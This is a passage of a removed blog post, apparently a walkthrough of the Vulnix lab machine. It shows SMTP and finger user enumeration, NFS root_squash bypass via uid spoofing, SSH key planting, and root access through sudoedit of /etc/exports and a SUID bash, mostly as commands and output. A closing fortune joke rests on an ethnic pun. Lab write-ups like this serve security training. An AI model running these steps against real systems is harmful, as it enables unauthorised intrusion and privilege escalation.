-No Plan.</p>
-
-<p>Login: dovenull                 Name: Dovecot login user
-Directory: /nonexistent                 Shell: /bin/false
-Never logged in.
-No mail.
-No Plan.</p>
-
-<p>finger <a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#58;&#118;&#x75;&#108;&#110;&#105;&#x78;&#64;&#49;&#57;&#50;&#x2e;&#49;&#54;&#56;&#46;&#50;&#49;&#55;&#x2e;&#49;&#52;&#50;">&#x76;&#117;&#x6c;&#x6e;&#105;&#x78;&#64;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#50;&#49;&#55;&#46;&#x31;&#52;&#50;</a>
-Login: vulnix                   Name:
-Directory: /home/vulnix                 Shell: /bin/bash
-Never logged in.
-No mail.
-No Plan.
-```</p>
-
-<h3>SMTP user enumeration</h3>
-
-<p>Since port 25 is open, we can also attempt some enumeration with SMTP. Again, this can be accomplished with an Nmap script, but this time I want to use an utility called <strong>smtp-user-enum</strong>.</p>
-
-<p>Homepage: <a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum">http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum</a></p>
-
-<blockquote><p>smtp-user-enum is a tool for enumerating OS-level user accounts on Solaris via the SMTP service (sendmail).
-Enumeration is performed by inspecting the responses to VRFY, EXPN and RCPT TO commands. It could be adapted to
-work against other vulnerable SMTP daemons, but this hasn’t been done as of v1.0.</p></blockquote>
-
-<p>Let&rsquo;s see its options:</p>
-
-<p>```
-smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>
-
-<p>Usage: smtp-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )</p>
-
-<p>options are:</p>
-
-<pre><code>    -m n     Maximum number of processes (default: 5)
--M mode  Method to use for username guessing EXPN, VRFY or RCPT (default: VRFY)
--u user  Check if user exists on remote system
--f addr  MAIL FROM email address.  Used only in "RCPT TO" mode (default: user@example.com)
-    -D dom   Domain to append to supplied user list to make email addresses (Default: none)
-             Use this option when you want to guess valid email addresses instead of just usernames
-             e.g. "-D example.com" would guess foo@example.com, bar@example.com, etc.  Instead of 
-                  simply the usernames foo and bar.
--U file  File of usernames to check via smtp service
--t host  Server host running smtp service
--T file  File of hostnames running the smtp service
--p port  TCP port on which smtp service runs (default: 25)
--d       Debugging output
--t n     Wait a maximum of n seconds for reply (default: 5)
--v       Verbose
--h       This help message
-</code></pre>
-
-<p>Also see smtp-user-enum-user-docs.pdf from the smtp-user-enum tar ball.</p>
-
-<p>Examples:</p>
-
-<p>$ smtp-user-enum.pl -M VRFY -U users.txt -t 10.0.0.1
-$ smtp-user-enum.pl -M EXPN -u admin1 -t 10.0.0.1
-$ smtp-user-enum.pl -M RCPT -U users.txt -T mail-server-ips.txt
-$ smtp-user-enum.pl -M EXPN -D example.com -U users.txt -t 10.0.0.1
-```</p>
-
-<p>I created a file named users.txt with some usernames to try, and fed it to the script:</p>
-
-<p>```
-root@kali:~# smtp-user-enum -U users.txt -t 192.168.217.142
-Starting smtp-user-enum v1.2 ( <a href="http://pentestmonkey.net/tools/smtp-user-enum">http://pentestmonkey.net/tools/smtp-user-enum</a> )</p>
-
-<hr />
-
-
-
-<hr />
-
-<p>Mode &hellip;&hellip;&hellip;&hellip;&hellip;&hellip;&hellip; VRFY
-Worker Processes &hellip;&hellip;&hellip; 5
-Usernames file &hellip;&hellip;&hellip;.. users.txt
-Target count &hellip;&hellip;&hellip;&hellip;. 1
-Username count &hellip;&hellip;&hellip;.. 6
-Target TCP port &hellip;&hellip;&hellip;. 25
-Query timeout &hellip;&hellip;&hellip;&hellip; 5 secs
-Target domain &hellip;&hellip;&hellip;&hellip;</p>
-
-<h6>## Scan started at Tue Jun 20 09:29:30 2017</h6>
-
-<p>192.168.217.142: root exists
-192.168.217.142: vulnix exists
-192.168.217.142: user exists
-192.168.217.142: postmaster exists
-192.168.217.142: mail exists</p>
-
-<h6>## Scan completed at Tue Jun 20 09:29:30 2017</h6>
-
-<p>5 results.</p>
-
-<p>6 queries in 1 seconds (6.0 queries / sec)
-```</p>
-
-<p>You can see that this is a pretty cool script that can help you enumerate users pretty fast, and now we know more valid user accounts on the system. You can also use it to find valid email addresses instead of accounts, by using the <em>-D</em> option. I tried a few examples, but got no hits.</p>
-
-<p>Moving on, ports 512-514 are fore the old r-utilities, and if misconfigured, could allow remote access to the host. But in this case, the system asked me for root&rsquo;s SSH password, so I couldn&rsquo;t exploit them.</p>
-
-<h3>Exploit NFS</h3>
-
-<p>We&rsquo;ve done some preliminary enumeration on the target, now it&rsquo;s time to return to the results of the Nmap scan. We&rsquo;ve identified the fact that NFS is running on the Vulnix host. I confirmed it with the use of <em>rpcinfo</em>:</p>
-
-<p>```
-rpcinfo -p 192.168.217.142
-   program vers proto   port  service</p>
-
-<pre><code>100000    4   tcp    111  portmapper
-100000    3   tcp    111  portmapper
-100000    2   tcp    111  portmapper
-100000    4   udp    111  portmapper
-100000    3   udp    111  portmapper
-100000    2   udp    111  portmapper
-100024    1   udp  39427  status
-100024    1   tcp  42309  status
-100003    2   tcp   2049  nfs
-100003    3   tcp   2049  nfs
-100003    4   tcp   2049  nfs
-100227    2   tcp   2049
-100227    3   tcp   2049
-100003    2   udp   2049  nfs
-100003    3   udp   2049  nfs
-100003    4   udp   2049  nfs
-100227    2   udp   2049
-100227    3   udp   2049
-100021    1   udp  39258  nlockmgr
-100021    3   udp  39258  nlockmgr
-100021    4   udp  39258  nlockmgr
-100021    1   tcp  34418  nlockmgr
-100021    3   tcp  34418  nlockmgr
-100021    4   tcp  34418  nlockmgr
-100005    1   udp  34638  mountd
-100005    1   tcp  52581  mountd
-100005    2   udp  42603  mountd
-100005    2   tcp  53226  mountd
-100005    3   udp  49704  mountd
-100005    3   tcp  47770  mountd
-</code></pre>
-
-<p>```</p>
-
-<p>If NFS wasn&rsquo;t properly configured, we might have access to shares we wouldn&rsquo;t otherwise be allowed to. There are a couple of ways to list the shares, and I&rsquo;m going to show here some of them. Th easiest way is from the command line, with the <code>showmount -e</code> command:</p>
-
-<p><code>
-root@kali:~# showmount -e 192.168.217.142
-Export list for 192.168.217.142:
-/home/vulnix *
-</code></p>
-
-<p>Good news! The vulnix home directory is being shared with no restrictions. Before going there, let&rsquo;s see how we can get the same information with Nmap:</p>
-
-<p>```
-nmap -sV -p111 &mdash;script=nfs-showmount 192.168.217.142</p>
-
-<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-06-21 06:00 EDT
-Nmap scan report for 192.168.217.142
-Host is up (0.00027s latency).
-PORT    STATE SERVICE VERSION
-111/tcp open  rpcbind 2-4 (RPC #100000)
-| nfs-showmount:
-|<em>  /home/vulnix *
-| rpcinfo:
-|   program version   port/proto  service
-|   100000  2,3,4        111/tcp  rpcbind
-|   100000  2,3,4        111/udp  rpcbind
-|   100003  2,3,4       2049/tcp  nfs
-|   100003  2,3,4       2049/udp  nfs
-|   100005  1,2,3      47770/tcp  mountd
-|   100005  1,2,3      49704/udp  mountd
-|   100021  1,3,4      34418/tcp  nlockmgr
-|   100021  1,3,4      39258/udp  nlockmgr
-|   100024  1          39427/udp  status
-|   100024  1          42309/tcp  status
-|   100227  2,3         2049/tcp  nfs_acl
-|</em>  100227  2,3         2049/udp  nfs_acl
-```</p>
-
-<p>We can also use the <em>auxiliary/scanner/nfs/nfsmount</em> Metasploit module:</p>
-
-<p>```
-msf auxiliary(nfsmount) > run</p>
-
-<p>[+] 192.168.217.142:111   &ndash; 192.168.217.142 NFS Export: /home/vulnix [<em>]
-[</em>] Scanned 1 of 1 hosts (100% complete)
-[*] Auxiliary module execution completed
-```</p>
-
-<p>I mounted the share locally to see what&rsquo;s there. The <em>nolock</em> option disables file locking and it&rsquo;s sometimes required for older NFS servers.</p>
-
-<p><code>
-root@kali:/mnt# mkdir nfs
-root@kali:/mnt# mount -t nfs -o nolock 192.168.217.142:/home/vulnix /mnt/nfs
-</code></p>
-
-<p>However, when I tried to access the newly mounted share, I got permission denied errors. I couldn&rsquo;t <em>chmod</em> or do anything else. After some reading on the interwebz, it seems the likely cause is the <a href="https://www.centos.org/docs/5/html/Deployment_Guide-en-US/s1-nfs-server-config-exports.html">root_squash</a> option, that nullifies the root privileges of the clients accessing the share, and instead gives them the user ID of the nobody user. It seems to be enabled by default on modern NFS implementations, and you can read more about it <a href="http://www.techrepublic.com/article/working-with-nfs/">here</a>.</p>
-
-<p>After some more digging through the interwebz, I found an <a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">interesting article about nfsshell</a>, which is a userspace NFS client shell. I downloaded it from its <a href="https://github.com/NetDirect/nfsshell">Github page</a>, and to compile I had to install the following <a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">dependencies</a>: <code>apt-get install libreadline-dev libncurses5-dev</code>. Afterwards, I ran <em>make</em> and it compiled fine. Here are its options:</p>
-
-<p><code>
-nfs&gt; help
-host &lt;host&gt; - set remote host name
-uid [&lt;uid&gt; [&lt;secret-key&gt;]] - set remote user id
-gid [&lt;gid&gt;] - set remote group id
-cd [&lt;path&gt;] - change remote working directory
-lcd [&lt;path&gt;] - change local working directory
-cat &lt;filespec&gt; - display remote file
-ls [-l] &lt;filespec&gt; - list remote directory
-get &lt;filespec&gt; - get remote files
-df - file system information
-rm &lt;file&gt; - delete remote file
-ln &lt;file1&gt; &lt;file2&gt; - link file
-mv &lt;file1&gt; &lt;file2&gt; - move file
-mkdir &lt;dir&gt; - make remote directory
-rmdir &lt;dir&gt; - remove remote directory
-chmod &lt;mode&gt; &lt;file&gt; - change mode
-chown &lt;uid&gt;[.&lt;gid&gt;] &lt;file&gt; -  change owner
-put &lt;local-file&gt; [&lt;remote-file&gt;] - put file
-mount [-upTU] [-P port] &lt;path&gt; - mount file system
-umount - umount remote file system
-umountall - umount all remote file systems
-export - show all exported file systems
-dump - show all remote mounted file systems
-status - general status report
-help - this help message
-quit - its all in the name
-bye - good bye
-handle [&lt;handle&gt;] - get/set directory file handle
-mknod &lt;name&gt; [b/c major minor] [p] - make device
-</code></p>
-
-<p>From my reading about NFS and root squashing, it seems that knowing the uid of the share&rsquo;s owner would allow mounting the share as that user and bypassing the access denied errors that I got as root. Because the share is the home folder of the vulnix user, we need to know the uid for that particular user account. But we need local access to the machine to find that out. Well, we did get some usernames from the enumeration stage, so we probably have to attempt a bruteforce attack. From all the discovered usernames, I only kept the user and vulnix ones, because the rest were users for various services on the system. And then I ran Hydra with the recommended task number for SSH:</p>
-
-<p><img class="center" src="/images/pentest/vulnix-hydra.png" title="&lsquo;hydra&rsquo; &lsquo;letmein&rsquo;" ></p>
-
-<p>Hydra found the password for user pretty quickly. I logged in as user, but didn&rsquo;t find anything out of the ordinary. However, I was able to get the uid for the vulnix account:</p>
-
-<p><code>
-user@vulnix:~$ id vulnix
-uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
-</code></p>
-
-<p>I went back to nfsshell and made the changes:</p>
-
-<p><code>
-nfs&gt; host 192.168.217.142
-Using a privileged port (1023)
-Open 192.168.217.142 (192.168.217.142) TCP
-nfs&gt; uid 2008
-nfs&gt; gid 2008
-nfs&gt; status
-User id      : 2008
-Group id     : 2008
-Remote host  : `192.168.217.142'
-Transfer size: 0
-</code></p>
-
-<p>Now I was able to access the share:</p>
-
-<p><code>
-nfs&gt; ls -l
-drwxr-x---  2     2008  2008      4096  Sep  2  2012  .
-drwxr-x---  2     2008  2008      4096  Sep  2  2012  ..
-drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bash_logout
-drwxr-x---  2     2008  2008      4096  Sep  2  2012  .bashrc
-drwxr-x---  2     2008  2008      4096  Sep  2  2012  .profile
-</code></p>
-
-<p>Since this is vulnix&rsquo;s home directory, we can put an SSH key in here to allow remote access. I tried the next steps through nfsshell, but I was limited in the commands I could run. So I created a local vulnix user on my machine, and assigned it the uid 2008: <code>root@kali:~# useradd vulnix -u 2008</code>. Then I generated an SSH key pair from this account:</p>
-
-<p><code>
-root@kali:~# su vulnix
-$ id
-uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
-$ cd /tmp
-$ ssh-keygen
-Generating public/private rsa key pair.
-Enter file in which to save the key (/home/vulnix/.ssh/id_rsa): vulnix
-Enter passphrase (empty for no passphrase):
-Enter same passphrase again:
-Your identification has been saved in vulnix.
-Your public key has been saved in vulnix.pub.
-The key fingerprint is:
-SHA256:P6FAPt9R/0TbOTtQUhk8SiBUlgAtINciO0mUmr2Nrp4 vulnix@kali
-The key's randomart image is:
-+---[RSA 2048]----+
-|  .o.oo.++o+o .oo|
-|   +o. o .o. ..+ |
-|  = + o .   o...o|
-| o = o     . oo.+|
-|    = + S o  ..+o|
-|   o . + + o  .oo|
-|  .     o +    o.|
-|  ..       .    .|
-|.E.              |
-+----[SHA256]-----+
-</code></p>
-
-<p>I now navigated without problems to the NFS share, created a .ssh directory and copied the contents of the public key to <em>authorized_keys</em>:</p>
-
-<p><code>
-$ cat /tmp/vulnix.pub &gt; .ssh/authorized_keys
-$ cat .ssh/authorized_keys
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuO5LOA1EIJeaFJHHic7NRNIUvOhBApq7CSu7PAM/THU4hngoZ4kglgFC9QdbsfQsRWLHsDmNcAAGLzIKwkLYXWYanBK/7xdmRmtGf0Sr32zZ4NaXP9B228fjUu5LSi42X/9HcfL9QdfXuB336OvXo43sDzLifrzoiBzlviZV55+uVd+/hI0GCRE3Yi9JrLs1A6NhuHq8xtRLJURhuGwoouA2tGZ+6fSr7t23bC1emBnyUiy2hu/4oS9tLvvptPv1Md9E+Ire6XMjZzCJufcSqiMVrVefnWv5j460TjHhKP7aq23nbzlxMqkZ8r9ovm5KW0UWWWyVPkOFSxPgFEaRr vulnix@kali
-</code></p>
-
-<p>And I was able to login with the key: <code>ssh -i /tmp/vulnix <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#x76;&#117;&#108;&#x6e;&#105;&#x78;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#49;&#x37;&#x2e;&#49;&#52;&#50;">&#118;&#117;&#108;&#110;&#x69;&#x78;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#46;&#50;&#x31;&#x37;&#46;&#x31;&#52;&#50;</a></code>. After some enumeration, I discovered that the vulnix user can edit <code>/etc/exports</code> with sudo privileges:</p>
-
-<p>```
-vulnix@vulnix:~$ sudo -l
-Matching &lsquo;Defaults&rsquo; entries for vulnix on this host:</p>
-
-<pre><code>env_reset,
-secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
-</code></pre>
-
-<p>User vulnix may run the following commands on this host:</p>
-
-<pre><code>(root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
-</code></pre>
-
-<p>```</p>
-
-<p>This is wonderful news. First of all, we need to disable <em>root_squash</em>. Then we can mount the root directory and read the flag, or we can leave a shell binary in vulnix&rsquo;s home directory, and run it later with root privileges. Let&rsquo;s do just that! I disabled root squashing with <code>/home/vulnix    *(rw,no_root_squash)</code>. Then I copied the bash executable:</p>
-
-<p><code>
-vulnix@vulnix:~$ cp /bin/bash /home/vulnix/
-vulnix@vulnix:~$ ls -l
-total 900
--rwxr-xr-x 1 vulnix vulnix 920788 Jun 21 14:46 bash
-</code></p>
-
-<p>For the NFS configuration changes to take effect, I needed to make the NFS service to reload its configuration file or restart it, but I didn&rsquo;t have permissions to do that. So I rebooted the machine (but unmounted the share first). After rebooting, I mounted the share again, navigated to it as root with no problems, and changed permissions on the bash shell to make it SUID: <code>chmod 4777 bash</code> (I also copied it again as root).</p>
-
-<p>From the SSH, I verified it as the vulnix user:</p>
-
-<p><code>
-vulnix@vulnix:~$ ls -l bash
--rwsrwxrwx 1 root root 920788 Jun 21 15:34 bash
-</code></p>
-
-<p>Finally, I ran the shell while preserving its permissions:</p>
-
-<p><code>
-vulnix@vulnix:~$ ./bash -p
-bash-4.2# whoami
-root
-bash-4.2# cat /root/trophy.txt
-cc614640424f5bd60ce5d5264899c3be
-</code></p>
-
-<p>Not done yet, I cracked the MD5 hash to reveal the name of the l33t name of the author: Reb00tu53r. This was a fun one!</p>
-
-<p><strong>Learn more</strong></p>
-
-<ul>
-<li><p><a href="https://www.phillips321.co.uk/2015/09/15/nfsshell-on-kali-linux-2-0/">NFSShell on Kali Linux</a></p></li>
-<li><p><a href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">Using nfsshell to compromise older environments</a></p></li>
-<li><p><a href="http://www.techrepublic.com/article/working-with-nfs/">Working with NFS</a></p></li>
-</ul>
-
-
-<p>```</p>
-
-<hr />
-
-<p>/ Q: What do you call a half-dozen    \
-| Indians with Asian flu? A: Six sick |
-\ Sikhs (sic).                        /</p>
 
 <hr />
 
